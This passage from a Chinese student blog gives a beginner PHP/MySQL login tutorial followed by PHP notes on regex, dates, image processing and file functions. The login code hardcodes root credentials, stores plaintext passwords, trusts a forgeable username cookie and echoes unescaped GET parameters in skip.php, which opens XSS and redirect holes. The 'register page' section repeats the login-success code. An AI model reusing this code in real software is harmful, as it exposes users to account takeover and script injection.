<h3 id="2-找到网站根目录，把文件放在WWW文件下"><a href="#2-找到网站根目录，把文件放在WWW文件下" class="headerlink" title="2.找到网站根目录，把文件放在WWW文件下"></a>2.找到网站根目录，把文件放在WWW文件下</h3><p><img src="https://img-blog.csdnimg.cn/20190428150934322.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>这里我新建了一个login文件夹来存放，其中包括以下几个文件：<br>login.php  登录页面<br>register.php  注册页面<br>loginout.php  注销页面<br>index.php  登录成功页面<br>skip.php  注销跳转页面</p>
<h2 id="二-登录页面"><a href="#二-登录页面" class="headerlink" title="二.登录页面"></a>二.登录页面</h2><p><img src="https://img-blog.csdnimg.cn/20190428152315492.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>下面是登录界面的代码:<br><strong>php部分代码</strong></p>
<pre><code>&lt;?php
if(isset($_POST[&apos;submit&apos;]))
{
    if(isset($_POST[&apos;name&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]) &amp;&amp; $_POST[&apos;name&apos;]!=NULL &amp;&amp; $_POST[&apos;password&apos;]!=NULL)
    {
        $link=mysqli_connect(&apos;localhost&apos;,&apos;root&apos;,&apos;yxld&apos;);//连接数据库
        if(mysqli_connect_errno())
        {
        exit(mysqli_connect_errno());
        }
        mysqli_select_db($link,&apos;login&apos;);
        $query=&quot;select * from t2 &quot;;//选择表
        $result=mysqli_query($link,$query);
        $a=0;
        while($colum=mysqli_fetch_array($result))
        {
            if($colum[&apos;name&apos;]===$_POST[&apos;name&apos;] &amp;&amp; $colum[&apos;password&apos;]===$_POST[&apos;password&apos;])
                {
                    $a++;
                    break;
                }
        }    
            if($a&gt;0)
            {
                if(setcookie(&apos;name&apos;,$colum[&apos;name&apos;],time()+600))
                {
                    header(&apos;Location:index.php&apos;);    
                }
            }
            else
            {
                echo &quot;账号或密码错误，或者没有注册&quot;;
            }        
    }
    else
    {
        echo &quot;账号或密码错误，或者没有注册&quot;;
    }    
}
?&gt;
</code></pre><p><strong>html+css部分代码</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;/&gt;</span><br><span class="line">&lt;title&gt;请登录&lt;/title&gt;</span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">/*body&#123;</span><br><span class="line">	background-image:url(jpg/4.jpg);</span><br><span class="line">	background-repeat:no-repeat;</span><br><span class="line">&#125;*/</span><br><span class="line">#head&#123;</span><br><span class="line">	margin-top:200px;</span><br><span class="line">	text-align: center;</span><br><span class="line">	font-family:&quot;楷体&quot;;/*设置字体*/</span><br><span class="line">	font-size:50px;/*设置字体大小*/</span><br><span class="line">	font-weight:2px;/*调整字体粗细*/</span><br><span class="line">	line-height: 35px;</span><br><span class="line">	&#125;</span><br><span class="line">.s&#123;</span><br><span class="line">	text-align: center;</span><br><span class="line">	font-family:&quot;楷体&quot;;/*设置字体*/</span><br><span class="line">	font-size:15px;/*设置字体大小*/ </span><br><span class="line">	&#125;</span><br><span class="line">.c&#123;</span><br><span class="line">	margin-left:0%;</span><br><span class="line">	border-radius:30px;</span><br><span class="line">&#125;</span><br><span class="line">#longin&#123;</span><br><span class="line">			</span><br><span class="line">		margin-left:46%;</span><br><span class="line">		width: 160px;</span><br><span class="line">		height: 25px;</span><br><span class="line">		background-color:pink;</span><br><span class="line">		border-radius:30px;</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">#then&#123;</span><br><span class="line"></span><br><span class="line">margin-left:46%;</span><br><span class="line">&#125;</span><br><span class="line">a&#123;</span><br><span class="line">	margin-left:2%;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;	</span><br><span class="line">&lt;boby&gt;</span><br><span class="line">   &lt;form method=&quot;post&quot; action=&quot;login.php&quot;&gt;</span><br><span class="line">   	&lt;p id=&quot;head&quot;&gt;用户登陆&lt;/p&gt;</span><br><span class="line">		&lt;p class=&quot;s&quot;&gt;账号：&lt;input type=&quot;text&quot; name=&quot;name&quot; class=&quot;c&quot; /&gt;&lt;/p&gt;</span><br><span class="line">		&lt;p class=&quot;s&quot;&gt;密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; class=&quot;c&quot; /&gt;&lt;/p&gt;</span><br><span class="line">		&lt;input type=&quot;submit&quot; value=&quot;登陆&quot; id=&quot;longin&quot; name=&quot;submit&quot; /&gt;</span><br><span class="line">		&lt;/br&gt;</span><br><span class="line">		&lt;p id=&quot;then&quot;&gt;没有账号？&lt;a href=&quot;register.php&quot;&gt;前往注册&lt;/a&gt; &lt;/p&gt;</span><br><span class="line">   &lt;/form&gt;</span><br><span class="line">&lt;/boby&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h2 id="三-注册页面"><a href="#三-注册页面" class="headerlink" title="三.注册页面"></a>三.注册页面</h2><p><img src="https://img-blog.csdnimg.cn/20190428153437955.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>注册界面的代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&apos;Content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">$link=mysqli_connect(&apos;localhost&apos;,&apos;root&apos;,&apos;yxld&apos;);</span><br><span class="line">		if(mysqli_connect_errno())</span><br><span class="line">		&#123;</span><br><span class="line">		exit(mysqli_connect_errno());</span><br><span class="line">		&#125;</span><br><span class="line">		mysqli_select_db($link,&apos;login&apos;);</span><br><span class="line">		$query=&quot;select * from t2 &quot;;</span><br><span class="line">		$result=mysqli_query($link,$query);</span><br><span class="line">		$a=0;</span><br><span class="line">		while($colum=mysqli_fetch_array($result))</span><br><span class="line">		&#123;</span><br><span class="line">			if(@($colum[&apos;name&apos;]===$_COOKIE[&apos;name&apos;]))</span><br><span class="line">				&#123;</span><br><span class="line">					$a++;</span><br><span class="line">					break;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">if(isset($_COOKIE[&apos;name&apos;])&amp;&amp;$a&gt;0)</span><br><span class="line">&#123;</span><br><span class="line">	echo&quot;亲爱的&#123;$_COOKIE[&apos;name&apos;]&#125;您好，恭喜登陆成功！&quot;;</span><br><span class="line">	echo&quot;&lt;a href=&apos;logout.php&apos;&gt;注销&lt;/a&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	echo&quot;&lt;a href=&apos;login.php&apos;&gt;请前往登录&lt;/a&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="四-注册成功页面"><a href="#四-注册成功页面" class="headerlink" title="四.注册成功页面"></a>四.注册成功页面</h2><p><img src="https://img-blog.csdnimg.cn/20190428153732822.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>注册成功后跳转到登录页面进行登录。</p>
<h2 id="五-登陆成功页面"><a href="#五-登陆成功页面" class="headerlink" title="五.登陆成功页面"></a>五.登陆成功页面</h2><p><img src="https://img-blog.csdnimg.cn/20190428154105115.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>另：明明为用户名<br>登录成功代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&apos;Content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">$link=mysqli_connect(&apos;localhost&apos;,&apos;root&apos;,&apos;yxld&apos;);</span><br><span class="line">		if(mysqli_connect_errno())</span><br><span class="line">		&#123;</span><br><span class="line">		exit(mysqli_connect_errno());</span><br><span class="line">		&#125;</span><br><span class="line">		mysqli_select_db($link,&apos;login&apos;);</span><br><span class="line">		$query=&quot;select * from t2 &quot;;</span><br><span class="line">		$result=mysqli_query($link,$query);</span><br><span class="line">		$a=0;</span><br><span class="line">		while($colum=mysqli_fetch_array($result))</span><br><span class="line">		&#123;</span><br><span class="line">			if(@($colum[&apos;name&apos;]===$_COOKIE[&apos;name&apos;]))</span><br><span class="line">				&#123;</span><br><span class="line">					$a++;</span><br><span class="line">					break;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">if(isset($_COOKIE[&apos;name&apos;])&amp;&amp;$a&gt;0)</span><br><span class="line">&#123;</span><br><span class="line">	echo&quot;亲爱的&#123;$_COOKIE[&apos;name&apos;]&#125;您好，恭喜登陆成功！&quot;;</span><br><span class="line">	echo&quot;&lt;a href=&apos;logout.php&apos;&gt;注销&lt;/a&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	echo&quot;&lt;a href=&apos;login.php&apos;&gt;请前往登录&lt;/a&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="六-注销及其跳转页面"><a href="#六-注销及其跳转页面" class="headerlink" title="六.注销及其跳转页面"></a>六.注销及其跳转页面</h2><p>登陆成功后点击注销，将进行跳转，其代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!isset($_GET[&apos;url&apos;])||!isset($_GET[&apos;info&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;/&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;3;URL=&lt;?php echo $_GET[&apos;url&apos;]?&gt;&quot;/&gt;</span><br><span class="line">&lt;title&gt;正在跳转中...&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;boby&gt;</span><br><span class="line">    &lt;div style=&quot;text-align:center;font-size:20px;&quot;&gt;&lt;?php echo $_GET[&apos;info&apos;]?&gt;,3秒后自动跳转！&lt;/div&gt;</span><br><span class="line">&lt;/boby&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>跳转后就是注销后的界面<br><img src="https://img-blog.csdnimg.cn/20190428154717254.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>注销成功就前往登录界面，注销代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&apos;Content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">if(isset($_COOKIE[&apos;name&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">	if(setcookie(&apos;name&apos;,$_COOKIE[&apos;name&apos;],time()-600))</span><br><span class="line">	&#123;</span><br><span class="line">		header(&apos;Location:skip.php?url=index.php&amp;info=注销成功，正在跳转中！&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		header(&apos;Location:skip.php?url=index.php&amp;info=注销失败，请稍后重试！&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>通过此次任务，我也学到了很多，比如数据库的连接、cookie会话控制等。虽然任务进程缓慢，完成任务不够及时，但是我也发现了自己学习的一些缺点，比如知识记得不够牢固，一些知识点不会运用等，所以以后需要在学习之后好好练习一番。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yxld.github.io/2019/04/21/php学习笔记（三）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yxld">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="clam">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/21/php学习笔记（三）/" itemprop="url">php学习笔记（三）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-21T20:34:46+08:00">
                2019-04-21
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="一-正则表达式"><a href="#一-正则表达式" class="headerlink" title="一.正则表达式"></a>一.正则表达式</h2><h3 id="1-理解正则表达式"><a href="#1-理解正则表达式" class="headerlink" title="1.理解正则表达式"></a>1.理解正则表达式</h3><p><strong>语法规则</strong><br>描述了一类字符串的特征，然后通过这个特征可以配合一些特定的函数，来完成对字符串更加复杂的一系列操作。正则表达式：普通字符和特殊字符组成的一个字符串。<br><strong>定界符</strong><br>一般习惯使用正斜线<code>/</code>作为定界的字符,前后一致<br><strong>普通字符</strong><br>比如：a-z，A-Z，0-9，双引号，单引号<br>它们没有特殊的含义。</p>
<h3 id="2-元字符"><a href="#2-元字符" class="headerlink" title="2.元字符"></a>2.元字符</h3><p>元字符指的是在正则表达式中有特殊含义的字符。</p>
<pre><code>\d  //匹配任意一个十进制数字，等价于[0-9]
\D    //匹配任意一个除十进制数字以外字符,等价于[^0-9]
\s    //匹配任意一个空白字符,比如换页符、换行符、回车符、制表符、垂直制表符
\S    //匹配除空白字符以外的任何一个字符
\w    //匹配任意一个数字或字母或下划线
\W    //匹配除数字、字母、下划线以外的任意一个字符
.    //匹配除换行符以外的任意一个字符 
*    //匹配0次、或1次、或多次其前面的字符
+    //匹配1次或多次其前面的字符
?    //匹配0次或1次其前面的字符
{n}    //表示其前面字符恰好出现n次
{n,}    //表示其前面字符出现不少于n次
{n,m}    //表示其前面的字符至少出现n次，最多出现m次
^或\A    //匹配字符串开始位置
$或者\Z    //匹配字符串的结束位置
|    //匹配两个或多个模式
[]    //匹配方括号中的任意一个字符
[^]    //匹配除方括号中字符以外的任意一个字符
()    //将括号中作为一个整体以便将其中的内容获取到,在我们的正则表达式中 可以使用圆括号来将某一段括起来，在圆括号的后面部分，我们可以使用\\数字 来代表圆括号部分所匹配到的内容！
</code></pre><h3 id="3-模式修正符"><a href="#3-模式修正符" class="headerlink" title="3.模式修正符"></a>3.模式修正符</h3><p>模式修正符是在正则表达式的定界符之后使用的，可以调整正则表达式的解释，扩展正则表达式在匹配换等操作是的某些功能，增强正则表达式的处理能力。<br><strong>常见模式修正符</strong></p>
<pre><code>i    //在和模式进行匹配时不区分大小写
m    //多行匹配，如果目标字符串 中没有&quot;\n&quot;字符, 或者模式中没有出现^或$, 设置这个修饰符不产生任何影响
s    //如果设定了此修正符，那么.将匹配所有的字符包括换行符
U    //禁止贪婪匹配
</code></pre><h3 id="4-与正则表达式配合的函数"><a href="#4-与正则表达式配合的函数" class="headerlink" title="4.与正则表达式配合的函数"></a>4.与正则表达式配合的函数</h3><p> <strong>preg_match()</strong> 执行一个正则表达式匹配<br>   <strong>preg_match_all()</strong> 执行一个全局正则表达式匹配<br>   <strong>preg_replace</strong> 执行一个正则表达式的搜索和替换</p>
<h2 id="二-日期与时间"><a href="#二-日期与时间" class="headerlink" title="二.日期与时间"></a>二.日期与时间</h2><p><strong>设置时区</strong></p>
<pre><code>date_default_timezone_set(&apos;Asia/Shanghai&apos;);//设置时区
</code></pre><p><strong>获取当前Unix时间戳</strong></p>
<pre><code>time()
</code></pre><p><strong>获取指定时间的Unix时间戳</strong></p>
<pre><code>mktime()
    date_default_timezone_set(&apos;Asia/Shanghai&apos;);//设置时区
    $nowTime=time();
    $time1=mktime(0,0,0,10,1,2019);//取得一个日期的 Unix 时间戳
    echo &apos;距离2019年国庆还有&apos;.(($time1-$nowTime)/60/60/24).&apos;天&apos;;
</code></pre><p><strong>从Unix时间戳取得时间日期信息</strong></p>
<pre><code>date()//格式化一个本地时间／日期,第一个参数:必填,写上你所需要的时间日期的格式,把format 字符放在第一个参数里面会被转换成对应的信息,其他的字符还是原来的样子
date(&apos;Y-m-d G:i:s&apos;)//自定义格式化Unix时间戳 为指定的时间格式!
</code></pre><p><strong>获取Unix时间戳和微秒数</strong></p>
<pre><code>microtime() //返回当前 Unix 时间戳和微秒数
</code></pre><h2 id="三-图像处理"><a href="#三-图像处理" class="headerlink" title="三.图像处理"></a>三.图像处理</h2><h3 id="1-创建图像的基本步骤"><a href="#1-创建图像的基本步骤" class="headerlink" title="1.创建图像的基本步骤"></a>1.创建图像的基本步骤</h3><p><strong>创建图像</strong><br>所有的绘图设计都需要在一个图像上完成，以后的操作都将基于这个图像。</p>
<pre><code>$img=imagecreatetruecolor(200,200);//新建一个长和高都为200像素的真彩色图像
</code></pre><p><strong>绘制图像</strong><br>图像创建完成后，就可以通过这个图像资源，使用各种图像函数设置图像的颜色、填充画布、画点、线段、各种几何图形以及向图像添加文本等。</p>
<pre><code>$color=imagecolorallocate($img,50,50,50);//分配颜色
imagefill($img,0,0,$color);//区域填充
</code></pre><p><strong>输出图像</strong><br>header()函数：</p>
<pre><code>header(&apos;Content-type:image/jpeg&apos;);//默认情况header(&apos;Content-type:text/html&apos;);
</code></pre><p>在该函数之前，不能输出任何内容。在我们的PHP代码 的函数里面，我们使用的/开头的路径，这个/不是指 web根目录,而是操作系统的文件的根目录。</p>
<pre><code>imagejpeg($img);//以JPEG格式将图像输出到浏览器或文件
</code></pre><p><strong>释放资源</strong></p>
<pre><code>imagedestroy($img);//销毁一图像
</code></pre><h3 id="2-验证码"><a href="#2-验证码" class="headerlink" title="2.验证码"></a>2.验证码</h3><pre><code>&lt;?php
header(&apos;Content-type:image/jpeg&apos;);
$width=120;
$height=40;
$element=array(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;,&apos;i&apos;,&apos;j&apos;,&apos;k&apos;,&apos;m&apos;,&apos;n&apos;,&apos;o&apos;,&apos;p&apos;,&apos;q&apos;,&apos;r&apos;,&apos;s&apos;,&apos;t&apos;,&apos;u&apos;,&apos;v&apos;,&apos;w&apos;,&apos;x&apos;,&apos;y&apos;,&apos;z&apos;);
$string=&apos;&apos;;
for ($i=0;$i&lt;5;$i++){
    $string.=$element[rand(0,count($element)-1)];
}
$img=imagecreatetruecolor($width, $height);//新建一个真彩色图像
$colorBg=imagecolorallocate($img,rand(200,255),rand(200,255),rand(200,255));//为一幅图像分配颜色
$colorBorder=imagecolorallocate($img,rand(200,255),rand(200,255),rand(200,255));//为一幅图像分配颜色
$colorString=imagecolorallocate($img,rand(10,100),rand(10,100),rand(10,100));//为一幅图像分配颜色
imagefill($img,0,0,$colorBg);//区域填充
imagerectangle($img,0,0,$width-1,$height-1,$colorBorder);//画一个矩形
for($i=0;$i&lt;100;$i++){
    imagesetpixel($img,rand(0,$width-1),rand(0,$height-1),imagecolorallocate($img,rand(100,200),rand(100,200),rand(100,200)));//画一个单一像素
}
for($i=0;$i&lt;3;$i++){
    imageline($img,rand(0,$width/2),rand(0,$height),rand($width/2,$width),rand(0,$height),imagecolorallocate($img,rand(100,200),rand(100,200),rand(100,200)));//画一条线段
}
//imagestring($img,5,0,0,&apos;abcd&apos;,$colorString);//水平地画一行字符串
imagettftext($img,14,rand(-5,5),rand(5,15),rand(30,35),$colorString,&apos;字体路径&apos;,$string);//用 TrueType 字体向图像写入文本
imagejpeg($img);//以JPEG格式将图像输出到浏览器或文件
imagedestroy($img);//销毁一图像
?&gt;
</code></pre><h3 id="3-水印"><a href="#3-水印" class="headerlink" title="3.水印"></a>3.水印</h3><pre><code>&lt;?php 
header(&apos;Content-type:image/jpeg&apos;);
$img=imagecreatefromjpeg(&apos;images/zcx.jpg&apos;);//由文件或 URL 创建一个新图象
$waterMark=imagecreatefromgif(&apos;路径&apos;);//由文件或 URL 创建一个新图象
$color=imagecolorallocate($img,255,255,255);//为一幅图像分配颜色

$width=imagesx($img);//取得图像宽度
$height=imagesy($img);//取得图像高度

$waterMarkWidth=imagesx($waterMark);
$waterMarkHeight=imagesy($waterMark);

$position=imagettfbbox(20,0,&apos;字体路径&apos;,&apos;水印&apos;);//给出一个使用 FreeType 2 字体的文本框
$stringWidth=$position[2]-$position[0];
//文字水印
//imagettftext($img,20,0,$width-1-$stringWidth-($width/30),$height-1-($height/30), $color,&apos;font/china1.TTF&apos;,&apos;水印&apos;);//使用 FreeType 2 字体将文本写入图像

/*
imagecopymerge($img,$waterMark,100,100,0,0,$waterMarkWidth,$waterMarkHeight,0);//拷贝并合并图像的一部分
参数说明：
$img:目标图像资源
$waterMark:水印的图像资源
100:所要拷贝到目标图像资源上面的坐标(x轴位置)
100:所要拷贝到目标图像资源上面的坐标(y轴位置)
0:从水印的图像资源的x坐标为0的位置开始拷贝
0:从水印的图像资源的y坐标为0的位置开始拷贝
$waterMarkWidth:所要拷贝的水印图像的长度
$waterMarkHeight:所要拷贝的水印图像的高度
0:表示透明度,数值越小就越透明，最大值100相当于和imagecopy这个函数一样

*/

imagecopymerge($img,$waterMark,$width-1-$waterMarkWidth,$height-1-$waterMarkHeight,0,0,$waterMarkWidth,$waterMarkHeight,30);//拷贝并合并图像的一部分

imagejpeg($img);//以JPEG格式将图像输出到浏览器或文件
imagedestroy($img);//销毁图像
?&gt;
</code></pre><h3 id="4-缩放与裁剪"><a href="#4-缩放与裁剪" class="headerlink" title="4.缩放与裁剪"></a>4.缩放与裁剪</h3><pre><code>&lt;?php
/*
等比例缩放
*/
header(&apos;Content-type:image/jpeg&apos;);
$width=300;
$img=imagecreatefromjpeg(&apos;路径&apos;); //由文件或 URL 创建一个新图象
$imgWidth=imagesx($img);
$imgHeight=imagesy($img);
$height=$width/($imgWidth/$imgHeight);
$img1=imagecreatetruecolor($width,$height);
/*
imagecopyresampled($dst_image, $src_image, $dst_x, $dst_y, $src_x, $src_y, $dst_w, $dst_h, $src_w, $src_h)//重采样拷贝部分图像并调整大小
参数说明：
$dst_image:目标图像资源
$src_image:源图像资源（你要采样的那个图像资源）
$dst_x:
$dst_y:与上面的$dst_x确定了一个坐标,把采样到的部分 放到目标图像资源的什么位置
$src_x:
$src_y:与上面的$src_y确定了一个坐标,你要采样的原图像资源的 某个部分的起始坐标
$dst_w:
$dst_h:与上面的$dst_w确定了 放到目标图像资源上面的尺寸
$src_w:
$src_h:与上面的$src_w确定了 采样原图像资源的 某个部分
*/
imagecopyresampled($img1,$img,0,0,0,0,$width,$height,$imgWidth,$imgHeight);
//裁剪
//imagecopyresampled($img1,$img,0,0,0,0,100,100,100,100);
if(imagejpeg($img1)){
    imagejpeg($img1,路径&apos;);
}
imagedestroy($img);
imagedestroy($img1);
?&gt;
</code></pre><p><strong>另</strong>：<a href="https://www.php.net/manual/zh/ref.image.php" target="_blank" rel="noopener">更多图像处理相关函数</a></p>
<h2 id="四-文件与目录操作"><a href="#四-文件与目录操作" class="headerlink" title="四.文件与目录操作"></a>四.文件与目录操作</h2><p><strong>判断普通文件和目录</strong></p>
<pre><code>is_file()//判断给定文件名是否为一个正常的文件
is_dir()//判断给定文件名是否是一个目录
</code></pre><p><strong>文件的属性</strong></p>
<pre><code>file_exists()//检查文件或目录是否存在
filesize()//取得普通文件大小
is_readable()//判断给定文件名是否可读
is_writable()//判断给定的文件名是否可写
filectime()//获取文件的创建时间
filemtime()//获取文件的修改时间
fileatime()//取得文件的上次访问时间
stat()//获取文件大部分属性值
</code></pre><h3 id="1-目录的基本操作"><a href="#1-目录的基本操作" class="headerlink" title="1.目录的基本操作"></a>1.目录的基本操作</h3><pre><code>1.basename()//返回路径中的文件名部分
2.dirname()//返回路径中的目录部分
3.pathinfo()//返回文件路径的信息
4.opendir()//打开目录句柄
5.readdir()//从目录句柄中读取条目,返回目录中下一个文件的文件名
6.rewinddir()//倒回目录句柄
7.closedir()//关闭目录句柄
8.mkdir()//新建目录
9.rmdir()//删除指定的空目录
10.scandir()//列出指定路径中的文件和目录
</code></pre><h3 id="2-文件的基本操作"><a href="#2-文件的基本操作" class="headerlink" title="2.文件的基本操作"></a>2.文件的基本操作</h3><pre><code>1.fopen()//打开文件或者 URL
2.fread()//读取文件
3.fgets()//从文件指针中读取一行
4.feof()//测试文件指针是否到了文件结束的位置
5.fwrite()//写入文件
6.rewind()//倒回文件指针的位置
7.flock()//轻便的咨询文件锁定
8.ftruncate()//将文件截断到给定的长度
9.fclose()//关闭一个已打开的文件指针
10.file() //把整个文件读入一个数组中
11.copy()//拷贝文件
12.unlink()//删除文件
13.file_get_contents()//将整个文件读入一个字符串
14.file_put_contents()//将字符串写入文件中
15.rename()//重命名一个文件或目录
16.readfile()//读入一个文件并写入到输出缓冲
</code></pre><h3 id="3-文件上传"><a href="#3-文件上传" class="headerlink" title="3.文件上传"></a>3.文件上传</h3><p>文件的上传的过程这些细节我们是不需要管的，都是自动的，上传的文件默认是放在一个临时的目录里面的，我们要做的就是把这些临时目录里面的文件移动到我们需要的地方就可以了。</p>
